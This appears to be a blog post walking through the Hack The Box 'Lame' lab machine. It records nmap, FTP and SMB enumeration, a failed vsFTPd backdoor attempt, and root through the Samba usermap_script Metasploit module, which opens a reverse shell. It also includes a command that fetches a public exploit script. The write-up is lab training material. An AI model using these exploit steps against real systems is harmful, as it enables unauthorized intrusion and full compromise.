---
layout: post
title: "Hack The Box: Lame Writeup"
box: "Lame"
box_ip: "10.129.18.214"
box_os: "Linux"
box_difficulty: "Easy"
---

### Lame is an easy Linux machine, requiring only one exploit to obtain root access. It was the first machine published on Hack The Box and was often the first machine for new users prior to its retirement.

Infrastructure Scanning with Nmap
We begin our assessment by launching an aggressive Nmap scan to identify active ports, core services, and exact software versions deployed on the target machine.

```terminal
└──╼ #nmap -sS -sV -sC -O -T4 10.129.18.214
Starting Nmap 7.95 ( [https://nmap.org](https://nmap.org) ) at 2026-06-19 11:43 CEST
Stats: 0:00:58 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.82% done; ETC: 11:44 (0:00:00 remaining)
Nmap scan report for 10.129.18.214
Host is up (0.037s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.16.205
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
```

Initial Observations
The port scan surfaces several high-value vectors for exploration:

Port 21 (FTP): Running vsFTPd 2.3.4. Crucially, the ftp-anon script confirms that anonymous authentication is allowed.  
Port 22 (SSH): Running an older OpenSSH 4.7p1.  
Ports 139/445 (SMB): Managed by an outdated Samba smbd 3.0.20-Debian stack.  

Investigating FTP Anonymous Access
Given the open anonymous login on port 21, we connected to evaluate the filesystem and check for exposed configurations or staged sensitive files.

```terminal
└──╼ #ftp 10.129.18.214
Connected to 10.129.18.214.
220 (vsFTPd 2.3.4)
Name (10.129.18.214:anogota9): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||34474|).
150 Here comes the directory listing.
226 Directory send OK.
```
The FTP root directory returned no files or subdirectories. This orientation proved to be a dead-end for data harvest.

Shifting focus to the network file-sharing layer, we leveraged enum4linux to enumerate local system users and exposed share points.
The user extraction process pulled an extensive list of accounts including root, nobody, msfadmin, and service accounts.
Reviewing share access privileges via enum4linux:

```text
//10.129.18.214/print$  Mapping: DENIED Listing: N/A Writing: N/A
//10.129.18.214/tmp      Mapping: OK Listing: OK Writing: N/A
//10.129.18.214/opt      Mapping: DENIED Listing: N/A Writing: N/A
```

To confirm access vector profiles, we validated the share definitions using smbmap:

```text
print$                                                  NO ACCESS       Printer Drivers
tmp                                                     READ, WRITE     oh noes!
opt                                                     NO ACCESS       
IPC$                                                    NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))
```

The share labeled /tmp mapped with permissive READ, WRITE flags. We established an unauthenticated interactive session using smbclient to map out its contents:

```terminal
smbclient -N //10.129.18.214/tmp
Anonymous login successful
smb: \> ls
  5672.jsvc_up                        R        0  Fri Jun 19 11:36:56 2026
  vgauthsvclog.txt.0                  R     1600  Fri Jun 19 11:35:43 2026
```

While the directory was fully accessible, checking the underlying files did not yield any immediate operational data or flags. This too was a dead end.

The vsFTPd 2.3.4 Backdoor Bottleneck
Researching historical flaws for vsFTPd 2.3.4 pointed directly to a notorious embedded backdoor flaw (exploit/unix/ftp/vsftpd_234_backdoor).
However, executing the exploit sequence through Metasploit constantly threw structural connectivity timeouts:

```text
[!] 10.129.18.214:21 - Unable to connect to backdoor on 6200/TCP. Cooldown?
```

Toggling the AutoCheck data fields between true/false and trying multiple payload structural classes brought no change.
To determine if the framework itself was introducing anomalies, we sourced a standalone Python exploit variant via GitHub:

```text
wget -q [https://raw.githubusercontent.com/chacka0101/exploits/refs/heads/master/Python-Vsftpd-2.3.4-Exploit.py](https://raw.githubusercontent.com/chacka0101/exploits/refs/heads/master/Python-Vsftpd-2.3.4-Exploit.py)
```

Running the independent script returned identical socket connection timeouts:

```text
[+] SUCCESSFUL CONNECTİON
[!] Failed to connect to backdoor
timed out
```

Even resetting the target container from the platform dashboard did not fix the problem.

Pivoting to Samba 3.0.20 (usermap_script)
Since the network transport layer for the backdoor was blocked, we turned to the exposed Samba stack running version 3.0.20.
This variant is vulnerable to arbitrary remote code execution via shell metacharacters handled within the "username map script" setting (CVE-2007-2447).
We loaded the module exploit/multi/samba/usermap_script in Metasploit, bound our configurations to the current internal routing map (tun0), and executed:

```terminal
[msf](Jobs:0 Agents:0) exploit(multi/samba/usermap_script) >> set RHOSTS 10.129.18.217
RHOSTS => 10.129.18.217
[msf](Jobs:0 Agents:0) exploit(multi/samba/usermap_script) >> set LHOST tun0
LHOST => 10.10.16.205
[msf](Jobs:0 Agents:0) exploit(multi/samba/usermap_script) >> run
[*] Started reverse TCP handler on 10.10.16.205:4444 
[*] Command shell session 1 opened (10.10.16.205:4444 -> 10.129.18.217:54009)

id
uid=0(root) gid=0(root)
```

The shell caught successfully, granting instant root-level access privileges without requiring additional local privilege escalation steps.

With full system access, we extracted the respective operational proof flags:

```text
cat /home/makis/user.txt
cat /root/root.txt
```

Post-Exploitation Debrief: Why Did vsFTPd Fail?
To understand why the vsFTPd backdoor failed, we reviewed the active sockets and security policies inside the system.
Running a loop test locally on the target loopback interface showed that connections to port 6200 were dropped directly by an internal network filter:

```text
(UNKNOWN) [127.0.0.1] 6200 (?) : Connection refused
```

Even when explicitly binding a handler (nc) to listen, the shell was prevented from establishing external states:

```text
tcp        0      0 0.0.0.0:6200            0.0.0.0:* LISTEN      8848/sh
```


<script>
document.addEventListener("DOMContentLoaded", function() {
  const content = document.querySelector('.markdown-body');
  if (!content) return;

  // Automatyczne dane z Front Matter na górze strony
  const boxName = "{{ page.box }}";
  const boxIp = "{{ page.box_ip }}";
  const boxOs = "{{ page.box_os }}";
  const boxDiff = "{{ page.box_difficulty }}";

  if (!boxName) return;

  // 1. Tworzymy kontener dwukolumnowy (Sidebar + Tekst)
  const wrapper = document.createElement('div');
  wrapper.className = 'blog-layout-wrapper';

  // 2. Tworzymy boczny panel (Sidebar)
  const aside = document.createElement('aside');
  aside.className = 'dynamic-sidebar';
  aside.innerHTML = `<h3 class="sidebar-box-title">HTB: ${boxName}</h3>`;
  
  const ul = document.createElement('ul');
  ul.className = 'sidebar-menu';

  // AUTOMATYKA: Łapiemy wszystkie prawdziwe podrozdziały (h2) z Twojego tekstu
  const headings = content.querySelectorAll('h2');
  
  if (headings.length > 0) {
    headings.forEach((heading, index) => {
      // Generujemy bezpieczne ID dla linku, jeśli nagłówek go nie ma
      if (!heading.id) {
        heading.id = 'section-' + index;
      }
      
      const li = document.createElement('li');
      // Pierwszy element dostaje klasę 'active' na start
      li.className = 'sidebar-item' + (index === 0 ? ' active' : '');
      li.innerHTML = `<a href="#${heading.id}">${heading.innerText}</a>`;
      ul.appendChild(li);
    });
  } else {
    // Rezerwowy punkt, gdyby w poście nie było jeszcze żadnych nagłówków h2
    const li = document.createElement('li');
    li.className = 'sidebar-item active';
    li.innerHTML = `<a href="#">Overview</a>`;
    ul.appendChild(li);
  }
  aside.appendChild(ul);

  // 3. Kontener na właściwy tekst artykułu
  const articleContainer = document.createElement('div');
  articleContainer.className = 'main-article-content';

  // Przebudowa struktury kodu na stronie
  content.parentNode.insertBefore(wrapper, content);
  wrapper.appendChild(aside);
  wrapper.appendChild(articleContainer);
  articleContainer.appendChild(content);

  // 4. Generowanie paska parametrów pod głównym tytułem (h1)
  const mainTitle = articleContainer.querySelector('h1');
  if (boxIp || boxOs || boxDiff) {
    const metaBar = document.createElement('div');
    metaBar.className = 'post-htb-metadata-bar';

    const osIcon = boxOs && boxOs.toLowerCase() === 'linux' ? '🐧' : '🪟';
    
    metaBar.innerHTML = `
      <div class="meta-bar-item">
        <span class="meta-bar-label">TARGET IP:</span>
        <span class="meta-bar-value target-ip">${boxIp ? boxIp : 'N/A'}</span>
      </div>
      <div class="meta-bar-item">
        <span class="meta-bar-label">OS:</span>
        <span class="meta-bar-value">${osIcon} ${boxOs ? boxOs : 'N/A'}</span>
      </div>
      <div class="meta-bar-item">
        <span class="meta-bar-label">DIFFICULTY:</span>
        <span class="meta-bar-value diff-text ${boxDiff ? boxDiff.toLowerCase() : ''}">${boxDiff ? boxDiff : 'N/A'}</span>
      </div>
    `;

    // Wstrzykujemy pasek idealnie pod główny nagłówek h1 (np. Anogota9)
    if (mainTitle) {
      mainTitle.parentNode.insertBefore(metaBar, mainTitle.nextSibling);
    } else {
      content.insertBefore(metaBar, content.firstChild);
    }
  }

  // Automatyczne przełączanie podświetlenia menu podczas przewijania strony (Scroll Spy)
  window.addEventListener('scroll', () => {
    let current = '';
    headings.forEach(heading => {
      const headingTop = heading.getBoundingClientRect().top;
      if (headingTop < 100) {
        current = heading.id;
      }
    });

    if (current) {
      document.querySelectorAll('.sidebar-item').forEach(li => {
        li.classList.remove('active');
        const a = li.querySelector('a');
        if (a && a.getAttribute('href') === `#${current}`) {
          li.classList.add('active');
        }
      });
    }
  });
});
</script>
